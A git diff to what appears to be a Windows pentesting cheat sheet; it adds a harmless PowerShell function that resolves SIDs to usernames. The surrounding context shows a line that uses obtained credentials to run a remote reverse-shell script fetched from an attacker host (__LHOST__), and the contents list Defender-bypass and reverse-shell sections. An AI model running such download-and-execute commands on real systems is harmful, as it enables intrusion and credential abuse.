@@ -23,6 +23,7 @@ Table of Contents
       * [To load a PS module into the memory](#to-load-a-ps-module-into-the-memory)
       * [Changing <em>ExecutionPolicy</em> to Bypass](#changing-executionpolicy-to-bypass)
       * [Executing commands as another user](#executing-commands-as-another-user)
+      * [Resolve SID to User](#resolve-sid-to-user)
       * [Reverse TCP One Liner](#reverse-tcp-one-liner)
    * [PrivEsc on Windows](#privesc-on-windows)
       * [Bypassing Windows Defender](#bypassing-windows-defender)
@@ -158,6 +159,29 @@ Have we obtained a shell from your objective and got any credentials we can use 
 $password = ConvertTo-SecureString '__PasswordObtained__' -Asplain -Force
 $credential = New-Object System.Management.Automation.PSCredential('__Domain__\__User__', $password)
 Invoke-Command -Computer __Hostname__ -Credential $credential -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://__LHOST__/rev.ps1') }
+```
+
+## Resolve SID to User
+From: https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/translating-sid-to-username
+
+```powershell
+
+function ConvertFrom-SID
+{
+  param
+  (
+    [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
+    [Alias('Value')]
+    $Sid 
+  )
+  
+  process
+  {
+    $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
+    $objUser = $objSID.Translate( [System.Security.Principal.NTAccount])
+    $objUser.Value
+  }
+}
 ```
 
 ## Reverse TCP One Liner
